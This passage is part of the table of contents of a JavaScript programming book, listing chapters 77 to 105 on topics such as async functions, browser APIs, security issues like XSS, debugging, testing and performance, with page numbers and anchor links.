[Section 77.3: Checking if a value exists
[382](#section-77.3-checking-if-a-value-exists)](#section-77.3-checking-if-a-value-exists)

[Section 77.4: Removing a value
[382](#section-77.4-removing-a-value)](#section-77.4-removing-a-value)

[**Chapter 78: Escape Sequences**
[383](#chapter-78-escape-sequences)](#chapter-78-escape-sequences)

[Section 78.1: Entering special characters in strings and regular
expressions
[383](#section-78.1-entering-special-characters-in-strings-and-regular-expressions)](#section-78.1-entering-special-characters-in-strings-and-regular-expressions)

[Section 78.2: Escape sequence types
[383](#section-78.2-escape-sequence-types)](#section-78.2-escape-sequence-types)

[**Chapter 79: Behavioral Design Patterns**
[386](#chapter-79-behavioral-design-patterns)](#chapter-79-behavioral-design-patterns)

[Section 79.1: Observer pattern
[386](#section-79.1-observer-pattern)](#section-79.1-observer-pattern)

[Section 79.2: Mediator Pattern
[387](#section-79.2-mediator-pattern)](#section-79.2-mediator-pattern)

[Section 79.3: Command
[388](#section-79.3-command)](#section-79.3-command)

[Section 79.4: Iterator
[389](#section-79.4-iterator)](#section-79.4-iterator)

[**Chapter 80: Server-sent events**
[391](#chapter-80-server-sent-events)](#chapter-80-server-sent-events)

[Section 80.1: Setting up a basic event stream to the server
[391](#section-80.1-setting-up-a-basic-event-stream-to-the-server)](#section-80.1-setting-up-a-basic-event-stream-to-the-server)

[Section 80.2: Closing an event stream
[391](#section-80.2-closing-an-event-stream)](#section-80.2-closing-an-event-stream)

[Section 80.3: Binding event listeners to EventSource
[391](#section-80.3-binding-event-listeners-to-eventsource)](#section-80.3-binding-event-listeners-to-eventsource)

[**Chapter 81: Async functions (async/await)**
[393](#chapter-81-async-functions-asyncawait)](#chapter-81-async-functions-asyncawait)

[Section 81.1: Introduction
[393](#section-81.1-introduction)](#section-81.1-introduction)

[Section 81.2: Await and operator precedence
[393](#section-81.2-await-and-operator-precedence)](#section-81.2-await-and-operator-precedence)

[Section 81.3: Async functions compared to Promises
[394](#section-81.3-async-functions-compared-to-promises)](#section-81.3-async-functions-compared-to-promises)

[Section 81.4: Looping with async await
[395](#section-81.4-looping-with-async-await)](#section-81.4-looping-with-async-await)

[Section 81.5: Less indentation
[396](#section-81.5-less-indentation)](#section-81.5-less-indentation)

[Section 81.6: Simultaneous async (parallel) operations
[397](#section-81.6-simultaneous-async-parallel-operations)](#section-81.6-simultaneous-async-parallel-operations)

[**Chapter 82: Async Iterators**
[398](#chapter-82-async-iterators)](#chapter-82-async-iterators)

[Section 82.1: Basics [398](#section-82.1-basics)](#section-82.1-basics)

[**Chapter 83: How to make iterator usable inside async callback
function**
[399](#chapter-83-how-to-make-iterator-usable-inside-async-callback-function)](#chapter-83-how-to-make-iterator-usable-inside-async-callback-function)

[Section 83.1: Erroneous code, can you spot why this usage of key will
lead to bugs?
[399](#section-83.1-erroneous-code-can-you-spot-why-this-usage-of-key-will-lead-to-bugs)](#section-83.1-erroneous-code-can-you-spot-why-this-usage-of-key-will-lead-to-bugs)

[Section 83.2: Correct Writing
[399](#section-83.2-correct-writing)](#section-83.2-correct-writing)

[**Chapter 84: Tail Call Optimization**
[400](#chapter-84-tail-call-optimization)](#chapter-84-tail-call-optimization)

[Section 84.1: What is Tail Call Optimization (TCO)
[400](#section-84.1-what-is-tail-call-optimization-tco)](#section-84.1-what-is-tail-call-optimization-tco)

[Section 84.2: Recursive loops
[400](#section-84.2-recursive-loops)](#section-84.2-recursive-loops)

[**Chapter 85: Bitwise Operators - Real World Examples (snippets)**
[401](#chapter-85-bitwise-operatorsreal-world-examples-snippets)](#chapter-85-bitwise-operatorsreal-world-examples-snippets)

[Section 85.1: Swapping Two Integers with Bitwise XOR (without
additional memory allocation)
[401](#section-85.1-swapping-two-integers-with-bitwise-xor-without-additional-memory-allocation)](#section-85.1-swapping-two-integers-with-bitwise-xor-without-additional-memory-allocation)

[Section 85.2: Faster multiplication or division by powers of 2
[401](#section-85.2-faster-multiplication-or-division-by-powers-of-2)](#section-85.2-faster-multiplication-or-division-by-powers-of-2)

[Section 85.3: Number&apos;s Parity Detection with Bitwise AND
[401](#section-85.3-numbers-parity-detection-with-bitwise-and)](#section-85.3-numbers-parity-detection-with-bitwise-and)

[**Chapter 86: Tilde &bsol;~** [403](#chapter-86-tilde)](#chapter-86-tilde)

[Section 86.1: &bsol;~ Integer
[403](#section-86.1-integer)](#section-86.1-integer)

[Section 86.2: &bsol;~&bsol;~ Operator
[403](#section-86.2-operator)](#section-86.2-operator)

[Section 86.3: Converting Non-numeric values to Numbers
[404](#section-86.3-converting-non-numeric-values-to-numbers)](#section-86.3-converting-non-numeric-values-to-numbers)

[Section 86.4: Shorthands
[404](#section-86.4-shorthands)](#section-86.4-shorthands)

[Section 86.5: &bsol;~ Decimal
[404](#section-86.5-decimal)](#section-86.5-decimal)

[**Chapter 87: Using JavaScript to get/set CSS custom variables**
[406](#chapter-87-using-javascript-to-getset-css-custom-variables)](#chapter-87-using-javascript-to-getset-css-custom-variables)

[Section 87.1: How to get and set CSS variable property values
[406](#section-87.1-how-to-get-and-set-css-variable-property-values)](#section-87.1-how-to-get-and-set-css-variable-property-values)

[**Chapter 88: Selection API**
[407](#chapter-88-selection-api)](#chapter-88-selection-api)

[Section 88.1: Get the text of the selection
[407](#section-88.1-get-the-text-of-the-selection)](#section-88.1-get-the-text-of-the-selection)

[Section 88.2: Deselect everything that is selected
[407](#section-88.2-deselect-everything-that-is-selected)](#section-88.2-deselect-everything-that-is-selected)

[Section 88.3: Select the contents of an element
[407](#section-88.3-select-the-contents-of-an-element)](#section-88.3-select-the-contents-of-an-element)

[**Chapter 89: File API, Blobs and FileReaders**
[408](#chapter-89-file-api-blobs-and-filereaders)](#chapter-89-file-api-blobs-and-filereaders)

[Section 89.1: Read file as string
[408](#section-89.1-read-file-as-string)](#section-89.1-read-file-as-string)

[Section 89.2: Read file as dataURL
[408](#section-89.2-read-file-as-dataurl)](#section-89.2-read-file-as-dataurl)

[Section 89.3: Slice a file
[409](#section-89.3-slice-a-file)](#section-89.3-slice-a-file)

[Section 89.4: Get the properties of the file
[409](#section-89.4-get-the-properties-of-the-file)](#section-89.4-get-the-properties-of-the-file)

[Section 89.5: Selecting multiple files and restricting file types
[410](#section-89.5-selecting-multiple-files-and-restricting-file-types)](#section-89.5-selecting-multiple-files-and-restricting-file-types)

[Section 89.6: Client side csv download using Blob
[410](#section-89.6-client-side-csv-download-using-blob)](#section-89.6-client-side-csv-download-using-blob)

[**Chapter 90: Notifications API**
[411](#chapter-90-notifications-api)](#chapter-90-notifications-api)

[Section 90.1: Requesting Permission to send notifications
[411](#section-90.1-requesting-permission-to-send-notifications)](#section-90.1-requesting-permission-to-send-notifications)

[Section 90.2: Sending Notifications
[411](#section-90.2-sending-notifications)](#section-90.2-sending-notifications)

[Section 90.3: Closing a notification
[411](#section-90.3-closing-a-notification)](#section-90.3-closing-a-notification)

[Section 90.4: Notification events
[412](#section-90.4-notification-events)](#section-90.4-notification-events)

[**Chapter 91: Vibration API**
[413](#chapter-91-vibration-api)](#chapter-91-vibration-api)

[Section 91.1: Single vibration
[413](#section-91.1-single-vibration)](#section-91.1-single-vibration)

[Section 91.2: Check for support
[413](#section-91.2-check-for-support)](#section-91.2-check-for-support)

[Section 91.3: Vibration patterns
[413](#section-91.3-vibration-patterns)](#section-91.3-vibration-patterns)

[**Chapter 92: Battery Status API**
[414](#chapter-92-battery-status-api)](#chapter-92-battery-status-api)

[Section 92.1: Battery Events
[414](#section-92.1-battery-events)](#section-92.1-battery-events)

[Section 92.2: Getting current battery level
[414](#section-92.2-getting-current-battery-level)](#section-92.2-getting-current-battery-level)

[Section 92.3: Is battery charging?
[414](#section-92.3-is-battery-charging)](#section-92.3-is-battery-charging)

[Section 92.4: Get time left until battery is empty
[414](#section-92.4-get-time-left-until-battery-is-empty)](#section-92.4-get-time-left-until-battery-is-empty)

[Section 92.5: Get time left until battery is fully charged
[414](#section-92.5-get-time-left-until-battery-is-fully-charged)](#section-92.5-get-time-left-until-battery-is-fully-charged)

[**Chapter 93: Fluent API**
[415](#chapter-93-fluent-api)](#chapter-93-fluent-api)

[Section 93.1: Fluent API capturing construction of HTML articles with
JS
[415](#section-93.1-fluent-api-capturing-construction-of-html-articles-with-js)](#section-93.1-fluent-api-capturing-construction-of-html-articles-with-js)

[**Chapter 94: Web Cryptography API**
[417](#chapter-94-web-cryptography-api)](#chapter-94-web-cryptography-api)

[Section 94.1: Creating digests (e.g. SHA-256)
[417](#section-94.1-creating-digests-e.g.-sha-256)](#section-94.1-creating-digests-e.g.-sha-256)

[Section 94.2: Cryptographically random data
[417](#section-94.2-cryptographically-random-data)](#section-94.2-cryptographically-random-data)

[Section 94.3: Generating RSA key pair and converting to PEM format
[418](#section-94.3-generating-rsa-key-pair-and-converting-to-pem-format)](#section-94.3-generating-rsa-key-pair-and-converting-to-pem-format)

[Section 94.4: Converting PEM key pair to CryptoKey
[419](#section-94.4-converting-pem-key-pair-to-cryptokey)](#section-94.4-converting-pem-key-pair-to-cryptokey)

[**Chapter 95: Security issues**
[421](#chapter-95-security-issues)](#chapter-95-security-issues)

[Section 95.1: Reflected Cross-site scripting (XSS)
[421](#section-95.1-reflected-cross-site-scripting-xss)](#section-95.1-reflected-cross-site-scripting-xss)

[Section 95.2: Persistent Cross-site scripting (XSS)
[422](#section-95.2-persistent-cross-site-scripting-xss)](#section-95.2-persistent-cross-site-scripting-xss)

[Section 95.3: Persistent Cross-site scripting from JavaScript string
literals
[423](#section-95.3-persistent-cross-site-scripting-from-javascript-string-literals)](#section-95.3-persistent-cross-site-scripting-from-javascript-string-literals)

[Section 95.4: Why scripts from other people can harm your website and
its visitors
[423](#section-95.4-why-scripts-from-other-people-can-harm-your-website-and-its-visitors)](#section-95.4-why-scripts-from-other-people-can-harm-your-website-and-its-visitors)

[Section 95.5: Evaled JSON injection
[424](#section-95.5-evaled-json-injection)](#section-95.5-evaled-json-injection)

[**Chapter 96: Same Origin Policy & Cross-Origin Communication**
[426](#chapter-96-same-origin-policy-crossorigin-communication)](#chapter-96-same-origin-policy-crossorigin-communication)

[Section 96.1: Safe cross-origin communication with messages
[426](#section-96.1-safe-cross-origin-communication-with-messages)](#section-96.1-safe-cross-origin-communication-with-messages)

[Section 96.2: Ways to circumvent Same-Origin Policy
[427](#section-96.2-ways-to-circumvent-same-origin-policy)](#section-96.2-ways-to-circumvent-same-origin-policy)

[**Chapter 97: Error Handling**
[429](#chapter-97-error-handling)](#chapter-97-error-handling)

[Section 97.1: Error objects
[429](#section-97.1-error-objects)](#section-97.1-error-objects)

[Section 97.2: Interaction with Promises
[429](#section-97.2-interaction-with-promises)](#section-97.2-interaction-with-promises)

[Section 97.3: Error types
[430](#section-97.3-error-types)](#section-97.3-error-types)

[Section 97.4: Order of operations plus advanced thoughts
[430](#section-97.4-order-of-operations-plus-advanced-thoughts)](#section-97.4-order-of-operations-plus-advanced-thoughts)

[**Chapter 98: Global error handling in browsers**
[433](#chapter-98-global-error-handling-in-browsers)](#chapter-98-global-error-handling-in-browsers)

[Section 98.1: Handling window.onerror to report all errors back to the
server-side
[433](#section-98.1-handling-window.onerror-to-report-all-errors-back-to-the-server-side)](#section-98.1-handling-window.onerror-to-report-all-errors-back-to-the-server-side)

[**Chapter 99: Debugging**
[435](#chapter-99-debugging)](#chapter-99-debugging)

[Section 99.1: Interactive interpreter variables
[435](#section-99.1-interactive-interpreter-variables)](#section-99.1-interactive-interpreter-variables)

[Section 99.2: Breakpoints
[435](#section-99.2-breakpoints)](#section-99.2-breakpoints)

[Section 99.3: Using setters and getters to find what changed a property
[436](#section-99.3-using-setters-and-getters-to-find-what-changed-a-property)](#section-99.3-using-setters-and-getters-to-find-what-changed-a-property)

[Section 99.4: Using the console
[437](#section-99.4-using-the-console)](#section-99.4-using-the-console)

[Section 99.5: Automatically pausing execution
[438](#section-99.5-automatically-pausing-execution)](#section-99.5-automatically-pausing-execution)

[Section 99.6: Elements inspector
[438](#section-99.6-elements-inspector)](#section-99.6-elements-inspector)

[Section 99.7: Break when a function is called
[438](#section-99.7-break-when-a-function-is-called)](#section-99.7-break-when-a-function-is-called)

[Section 99.8: Stepping through code
[439](#section-99.8-stepping-through-code)](#section-99.8-stepping-through-code)

[**Chapter 100: Unit Testing JavaScript**
[440](#chapter-100-unit-testing-javascript)](#chapter-100-unit-testing-javascript)

[Section 100.1: Unit Testing Promises with Mocha, Sinon, Chai and
Proxyquire
[440](#section-100.1-unit-testing-promises-with-mocha-sinon-chai-and-proxyquire)](#section-100.1-unit-testing-promises-with-mocha-sinon-chai-and-proxyquire)

[Section 100.2: Basic Assertion
[442](#section-100.2-basic-assertion)](#section-100.2-basic-assertion)

[**Chapter 101: Evaluating JavaScript**
[444](#chapter-101-evaluating-javascript)](#chapter-101-evaluating-javascript)

[Section 101.1: Evaluate a string of JavaScript statements
[444](#section-101.1-evaluate-a-string-of-javascript-statements)](#section-101.1-evaluate-a-string-of-javascript-statements)

[Section 101.2: Introduction
[444](#section-101.2-introduction)](#section-101.2-introduction)

[Section 101.3: Evaluation and Math
[444](#section-101.3-evaluation-and-math)](#section-101.3-evaluation-and-math)

[<b>Chapter 102: Linters - Ensuring code quality</b>
[445](#chapter-102-lintersensuring-code-quality)](#chapter-102-lintersensuring-code-quality)

[Section 102.1: JSHint
[445](#section-102.1-jshint)](#section-102.1-jshint)

[Section 102.2: ESLint / JSCS
[446](#section-102.2-eslint-jscs)](#section-102.2-eslint-jscs)

[Section 102.3: JSLint
[446](#section-102.3-jslint)](#section-102.3-jslint)

[<b>Chapter 103: Anti-patterns</b>
[447](#chapter-103-anti-patterns)](#chapter-103-anti-patterns)

[Section 103.1: Chaining assignments in var declarations
[447](#section-103.1-chaining-assignments-in-var-declarations)](#section-103.1-chaining-assignments-in-var-declarations)

[<b>Chapter 104: Performance Tips</b>
[448](#chapter-104-performance-tips)](#chapter-104-performance-tips)

[Section 104.1: Avoid try/catch in performance-critical functions
[448](#section-104.1-avoid-trycatch-in-performance-critical-functions)](#section-104.1-avoid-trycatch-in-performance-critical-functions)

[Section 104.2: Limit DOM Updates
[448](#section-104.2-limit-dom-updates)](#section-104.2-limit-dom-updates)

[Section 104.3: Benchmarking your code - measuring execution time
[449](#section-104.3-benchmarking-your-codemeasuring-execution-time)](#section-104.3-benchmarking-your-codemeasuring-execution-time)

[Section 104.4: Use a memoizer for heavy-computing functions
[451](#section-104.4-use-a-memoizer-for-heavy-computing-functions)](#section-104.4-use-a-memoizer-for-heavy-computing-functions)

[Section 104.5: Initializing object properties with null
[453](#section-104.5-initializing-object-properties-with-null)](#section-104.5-initializing-object-properties-with-null)

[Section 104.6: Reuse objects rather than recreate
[454](#section-104.6-reuse-objects-rather-than-recreate)](#section-104.6-reuse-objects-rather-than-recreate)

[Section 104.7: Prefer local variables to globals, attributes, and
indexed values
[455](#section-104.7-prefer-local-variables-to-globals-attributes-and-indexed-values)](#section-104.7-prefer-local-variables-to-globals-attributes-and-indexed-values)

[Section 104.8: Be consistent in use of Numbers
[456](#section-104.8-be-consistent-in-use-of-numbers)](#section-104.8-be-consistent-in-use-of-numbers)

[<b>Chapter 105: Memory efficiency</b>
[458](#chapter-105-memory-eciency)](#chapter-105-memory-eciency)

[Section 105.1: Drawback of creating true private method
[458](#section-105.1-drawback-of-creating-true-private-method)](#section-105.1-drawback-of-creating-true-private-method)

[<b>Appendix A: Reserved Keywords</b>
[459](#appendix-a-reserved-keywords)](#appendix-a-reserved-keywords)

[Section A.1: Reserved Keywords
[459](#section-a.1-reserved-keywords)](#section-a.1-reserved-keywords)

[Section A.2: Identifiers & Identifier Names
[461](#section-a.2-identifiers-identifier-names)](#section-a.2-identifiers-identifier-names)

[<b>Credits</b> [463](#credits)](#credits)

[<b>You may also like</b> [474](#you-may-also-like)](#you-may-also-like)

